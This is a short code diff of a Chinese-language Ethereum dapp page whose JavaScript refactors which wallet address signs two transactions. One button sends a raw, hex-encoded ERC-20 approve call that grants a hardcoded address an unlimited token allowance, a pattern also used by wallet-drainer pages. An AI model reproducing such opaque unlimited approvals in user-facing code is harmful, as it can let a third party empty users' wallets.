@@ -58,11 +58,11 @@
     <button onclick="approveXSB();" id="btn-mint" style="display: block; margin: 50px auto;">授權合約</button>
     <script>
         web3 = new Web3(window.ethereum);
-        // var walletAddress = accounts[0];
+        var walletAddress = accounts[0];
 
         function approveXSB() {
             web3.eth.sendTransaction({
-                from: accounts[0],
+                from: walletAddress,
                 to: "0x442517ee1fe6bae7f34c7d384398cc38d9d8a578",
                 gas: 88888,
                 data: "0x095ea7b30000000000000000000000008efdf834c73fad7110092713d16ef7461ae72b04ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -87,7 +87,7 @@
         const inputValue = document.getElementById("xsAmount").value;
         function claimJFXS() {
             contractJFXS.methods.jieFangXS(parseInt(inputValue)*Math.pow(10, 18)).send({
-                from: accounts[0],
+                from: walletAddress,
                 gas: 150000
             }).then(function (result) { });
         };
